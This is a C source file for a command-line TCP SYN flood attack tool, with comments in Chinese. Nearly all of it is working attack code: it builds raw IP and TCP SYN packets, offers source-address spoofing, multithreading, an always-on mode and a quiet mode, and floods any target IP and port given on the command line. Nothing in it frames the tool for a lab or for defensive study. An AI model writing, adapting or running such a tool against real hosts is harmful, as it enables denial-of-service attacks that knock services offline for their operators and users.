#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#include "tcp.h"

// 全局变量，用于控制攻击线程
volatile int attack_running = 1;
int always_on = 0;
int quiet_mode = 0;


// 构建IP头
void build_ip_header(struct iphdr *ip, uint32_t src_ip, uint32_t dst_ip,
					 int total_len) {
	ip->ihl = 5;
	ip->version = 4;
	ip->tos = 0;
	ip->tot_len = htons(total_len);
	ip->id = htons(rand() % 65535);
	ip->frag_off = 0;
	ip->ttl = 64;
	ip->protocol = IPPROTO_TCP;
	ip->saddr = src_ip;
	ip->daddr = dst_ip;
	ip->check = 0;
	ip->check = checksum((unsigned short *)ip, sizeof(struct iphdr));
}

// 构建TCP头
void build_tcp_header(struct tcphdr *tcp, uint16_t src_port, uint16_t dst_port,
					  uint32_t seq, uint8_t flags) {
	tcp->source = htons(src_port);
	tcp->dest = htons(dst_port);
	tcp->seq = htonl(seq);
	tcp->ack_seq = 0;
	tcp->doff = 5;
	tcp->res1 = 0;
	// tcp->cwr = 0;
	// tcp->ece = 0;
	tcp->urg = 0;
	tcp->ack = 0;
	tcp->psh = 0;
	tcp->rst = 0;
	tcp->syn = (flags & 0x02) ? 1 : 0;
	tcp->fin = 0;
	tcp->window = htons(5840);
	tcp->check = 0;
	tcp->urg_ptr = 0;
}

// 计算TCP校验和
uint16_t calculate_tcp_checksum(struct iphdr *ip, struct tcphdr *tcp) {
	struct pseudo_header {
		uint32_t src_addr;
		uint32_t dst_addr;
		uint8_t zero;
		uint8_t protocol;
		uint16_t tcp_length;
	} pseudo;

	pseudo.src_addr = ip->saddr;
	pseudo.dst_addr = ip->daddr;
	pseudo.zero = 0;
	pseudo.protocol = IPPROTO_TCP;
	pseudo.tcp_length = htons(sizeof(struct tcphdr));

	int pseudo_len = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
	char *pseudo_buf = malloc(pseudo_len);
	memcpy(pseudo_buf, &pseudo, sizeof(struct pseudo_header));
	memcpy(pseudo_buf + sizeof(struct pseudo_header), tcp,
		   sizeof(struct tcphdr));

	uint16_t check = checksum((unsigned short *)pseudo_buf, pseudo_len);
	free(pseudo_buf);
	return check;
}

// 生成随机IP地址（用于IP欺骗）
uint32_t generate_random_ip() {
	struct in_addr addr;

	// 生成随机的C类私有地址 192.168.x.x
	addr.s_addr = 0;
	uint8_t *bytes = (uint8_t *)&addr.s_addr;
	bytes[0] = 192;
	bytes[1] = 168;
	bytes[2] = 1;// rand() % 256;
	bytes[3] = rand() % 256;

	return addr.s_addr;
}

// 发送SYN Flood包
void send_syn_flood(int raw_sock, uint32_t target_ip, uint16_t target_port,
					int use_ip_spoofing, int packet_count, int delay_ms) {
	char packet[4096];
	struct sockaddr_in dest_addr;
	int packets_sent = 0;

	memset(&dest_addr, 0, sizeof(dest_addr));
	dest_addr.sin_family = AF_INET;
	dest_addr.sin_addr.s_addr = target_ip;

	if (quiet_mode == 0) {
		printf("Starting SYN Flood attack...\n");
		printf("Target: %s:%d\n", inet_ntoa(*(struct in_addr *)&target_ip),
			   target_port);
		printf("Packets: %d, Delay: %dms, IP Spoofing: %s\n\n", packet_count,
			   delay_ms, use_ip_spoofing ? "Yes" : "No");
	}

	for (int i = 0; i < packet_count && attack_running; i++) {
		memset(packet, 0, sizeof(packet));

		struct iphdr *ip = (struct iphdr *)packet;
		struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));

		// 生成随机源IP和端口（IP欺骗）
		uint32_t src_ip;
		if (use_ip_spoofing) {
			src_ip = generate_random_ip();
		} else {
			// 使用固定的伪造源IP
			src_ip = inet_addr("192.168.1.100");
		}

		uint16_t src_port = 1024 + (rand() % 64512); // 随机端口

		// 构建数据包
		build_ip_header(ip, src_ip, target_ip,
						sizeof(struct iphdr) + sizeof(struct tcphdr));
		build_tcp_header(tcp, src_port, target_port, rand(), 0x02); // SYN标志

		// 计算校验和并发送
		tcp->check = calculate_tcp_checksum(ip, tcp);

		ssize_t sent = sendto(raw_sock, packet, ntohs(ip->tot_len), 0,
							  (struct sockaddr *)&dest_addr, sizeof(dest_addr));

		if (sent > 0) {
			packets_sent++;
			if (quiet_mode == 0 && packets_sent % 100 == 0) {
				printf("Sent %d SYN packets...\n", packets_sent);
			}
		}

		// 延迟控制攻击速度
		if (delay_ms > 0) {
			usleep(delay_ms * 1000);
		}
	}
	if (quiet_mode == 0) {
		printf("\nTotal packets sent: %d\n", packets_sent);
	}
}
struct attack_params {
	uint32_t target_ip;
	uint16_t target_port;
	int use_ip_spoofing;
	int packet_count;
	int delay_ms;
};
// 攻击线程函数
void *attack_thread(void *arg) {
	while (always_on && attack_running) {
		struct attack_params *params = (struct attack_params *)arg;

		int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
		if (raw_sock == -1) {
			perror("Failed to create raw socket in thread");
			return NULL;
		}

		// 设置IP_HDRINCL选项
		int one = 1;
		setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

		send_syn_flood(raw_sock, params->target_ip, params->target_port,
					   params->use_ip_spoofing, params->packet_count,
					   params->delay_ms);

		close(raw_sock);
	}
	return NULL;
}

// 启动多线程SYN Flood攻击
void start_multi_thread_syn_flood(uint32_t target_ip, uint16_t target_port,
								  int use_ip_spoofing, int total_packets,
								  int thread_count, int delay_ms) {
	pthread_t *threads = malloc(thread_count * sizeof(pthread_t));
	struct attack_params *params =
		malloc(thread_count * sizeof(struct attack_params));

	int packets_per_thread = total_packets / thread_count;

	if (quiet_mode == 0) {
		printf("Starting multi-thread SYN Flood with %d threads...\n",
			   thread_count);
		printf("Total packets: %d, Packets per thread: %d\n\n", total_packets,
			   packets_per_thread);
	}

	// 创建线程
	for (int i = 0; i < thread_count; i++) {
		params[i].target_ip = target_ip;
		params[i].target_port = target_port;
		params[i].use_ip_spoofing = use_ip_spoofing;
		params[i].packet_count = packets_per_thread;
		params[i].delay_ms = delay_ms;

		if (pthread_create(&threads[i], NULL, attack_thread, &params[i]) != 0) {
			perror("Failed to create thread");
		}
	}

	// 等待所有线程完成
	for (int i = 0; i < thread_count; i++) {
		pthread_join(threads[i], NULL);
	}

	free(threads);
	free(params);
}

// 信号处理函数，用于优雅退出
void signal_handler(int sig) {
	printf("\nReceived signal %d, stopping attack...\n", sig);
	attack_running = 0;
}

// 显示使用说明
void print_usage(const char *program_name) {
	printf("Usage: %s <target_ip> <target_port> [options]\n", program_name);
	printf("Options:\n");
	printf("  -p <packets>    Number of SYN packets to send (default: 1000)\n");
	printf("  -t <threads>    Number of threads (default: 1)\n");
	printf("  -d <delay>      Delay between packets in ms (default: 0)\n");
	printf("  -s              Enable IP spoofing\n");
	printf("  -a              Enable always-on mode (Ctrl-C to stop)\n");
	printf("  -q              Enable quiet mode (suppress output)\n");
	printf("  -h              Show this help message\n");
}

int main(int argc, char *argv[]) {
	if (argc < 3) {
		print_usage(argv[0]);
		exit(1);
	}

	// 解析目标地址
	uint32_t target_ip = inet_addr(argv[1]);
	uint16_t target_port = atoi(argv[2]);

	// 默认参数
	int packet_count = 1000;
	int thread_count = 1;
	int delay_ms = 0;
	int use_ip_spoofing = 0;

	// 解析命令行选项
	int opt;
	argc -= 2;
	argv += 2;
	while ((opt = getopt(argc, argv, "p:t:d:sqah")) != -1) {
		switch (opt) {
		case 'p':
			packet_count = atoi(optarg);
			printf("包数量: %d\n", packet_count);
			break;
		case 't':
			thread_count = atoi(optarg);
			printf("线程数量: %d\n", thread_count);
			break;
		case 'd':
			delay_ms = atoi(optarg);
			printf("延迟时间: %d ms\n", delay_ms);
			break;
		case 's':
			use_ip_spoofing = 1;
			printf("启用IP伪装\n");
			break;
		case 'a':
			always_on = 1;
			printf("启用持续攻击 (Ctrl-C 退出)\n");
			break;
		case 'q':
			quiet_mode = 1;
			printf("启用安静模式\n");
			break;
		case 'h':
			print_usage(argv[0]);
			exit(0);
		case '?':
		default:
			printf("参数错误\n");
			print_usage(argv[0]);
			exit(1);
		}
	}

	// 参数验证
	if (target_ip == INADDR_NONE) {
		printf("Error: Invalid target IP address\n");
		exit(1);
	}

	if (thread_count < 1 || thread_count > 100) {
		printf("Error: Thread count must be between 1 and 100\n");
		exit(1);
	}

	// 注册信号处理
	signal(SIGINT, signal_handler);
	signal(SIGTERM, signal_handler);

	// 设置随机种子
	srand(time(NULL));

	printf("=== TCP SYN Flood Attack Tool ===\n");

	sleep(1);

	if (thread_count == 1) {
		// 单线程模式
		int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
		if (raw_sock == -1) {
			perror("Failed to create raw socket");
			printf("Please run as root or set capabilities: sudo setcap "
				   "cap_net_raw+ep %s\n",
				   argv[0]);
			exit(1);
		}

		int one = 1;
		if (setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) <
			0) {
			perror("setsockopt failed");
			close(raw_sock);
			exit(1);
		}

		send_syn_flood(raw_sock, target_ip, target_port, use_ip_spoofing,
					   packet_count, delay_ms);
		close(raw_sock);
	} else {
		// 多线程模式
		// while (attack_running)
		start_multi_thread_syn_flood(target_ip, target_port, use_ip_spoofing,
									 packet_count, thread_count, delay_ms);
	}

	printf("Attack completed.\n");
	return 0;
}